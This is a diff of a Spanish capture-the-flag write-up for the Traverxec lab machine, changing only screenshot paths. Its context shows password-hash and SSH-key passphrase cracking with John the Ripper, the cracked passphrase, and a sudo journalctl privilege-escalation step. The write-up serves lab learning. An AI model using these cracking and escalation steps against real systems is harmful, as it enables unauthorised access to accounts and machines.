@@ -73,7 +73,7 @@ No tenemos acceso al directorio `/home/david`, así que enumeramos la configurac
 cat nhttpd.conf
 ```
 
-![Configuración de nostromo: confirma rutas de htpasswd, homedirs y docroot](traverxec-01-nhttpd-conf.png)
+![Configuración de nostromo: confirma rutas de htpasswd, homedirs y docroot](capturas/traverxec-01-nhttpd-conf.png)
 
 El fichero `.htpasswd` (oculto, hay que listar con `ls -la`) contiene el hash de la contraseña web de `david`:
 
@@ -81,7 +81,7 @@ El fichero `.htpasswd` (oculto, hay que listar con `ls -la`) contiene el hash de
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 ```
 
-![.htpasswd dentro de la carpeta conf, con el hash de david](traverxec-02-htpasswd-hash.png)
+![.htpasswd dentro de la carpeta conf, con el hash de david](capturas/traverxec-02-htpasswd-hash.png)
 
 Lo crackeamos con John the Ripper:
 
@@ -114,11 +114,11 @@ home/david/.ssh/id_rsa
 home/david/.ssh/id_rsa.pub
 ```
 
-![Extracción del backup: aparecen las claves SSH de david](traverxec-03-backup-extraido.png)
+![Extracción del backup: aparecen las claves SSH de david](capturas/traverxec-03-backup-extraido.png)
 
 La clave privada está protegida con passphrase:
 
-![ssh-keygen confirma que id_rsa está cifrada: la passphrase vacía no funciona](traverxec-04-id-rsa-cifrada.png)
+![ssh-keygen confirma que id_rsa está cifrada: la passphrase vacía no funciona](capturas/traverxec-04-id-rsa-cifrada.png)
 
 La extraemos en un formato que John pueda crackear y la atacamos con el mismo diccionario:
 
@@ -131,7 +131,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
 hunter          (./home/david/.ssh/id_rsa)
 ```
 
-![John crackea la passphrase de la clave privada: hunter](traverxec-05-john-passphrase.png)
+![John crackea la passphrase de la clave privada: hunter](capturas/traverxec-05-john-passphrase.png)
 
 Con la clave ya descifrable, nos conectamos por SSH como `david`:
 
@@ -166,7 +166,7 @@ El script muestra que ejecuta, entre otras cosas:
 
 Confirmamos con `sudo -l` que `david` puede lanzar exactamente ese comando como root sin contraseña. También comprobamos que el propio script no se puede sobrescribir (`chattr`/inmutable), así que atacamos directamente el comando permitido:
 
-![Enumeración dentro de ~/bin: el script es inmutable, se revisa cron y timers del sistema](traverxec-06-enumeracion-david.png)
+![Enumeración dentro de ~/bin: el script es inmutable, se revisa cron y timers del sistema](capturas/traverxec-06-enumeracion-david.png)
 
 ```bash
 sudo /usr/bin/journalctl -n5 -unostromo.service
